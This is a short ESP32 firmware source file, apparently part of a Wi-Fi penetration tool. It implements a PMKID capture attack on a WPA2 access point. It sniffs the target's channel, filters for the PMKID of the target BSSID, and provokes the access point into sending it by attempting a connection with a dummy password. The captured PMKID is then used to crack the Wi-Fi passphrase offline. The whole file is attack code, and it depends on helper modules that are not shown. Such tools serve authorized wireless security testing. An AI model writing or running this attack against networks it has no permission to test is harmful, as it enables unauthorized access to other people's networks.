#include "attack_pmkid.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"

static const char* TAG = "attack_pmkid";

static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGI(TAG, "Got PMKID, stopping attack...");
    // wifictl_sniffer_stop();
    // wifictl_sta_disconnect();
    // frame_analyzer_pmkid_capture_stop();
}

void attack_pmkid(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Attack on PMKID...");
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(attack_config->ap_record->primary);
    frame_analyzer_capture_pmkid(attack_config->ap_record->bssid);
    wifictl_sta_connect_to_ap(attack_config->ap_record, "dummypassword");
    ESP_ERROR_CHECK(esp_event_handler_register(DATA_FRAME_EVENTS, DATA_FRAME_EVENT_FOUND_PMKID, &pmkid_exit_condition_handler, NULL));
}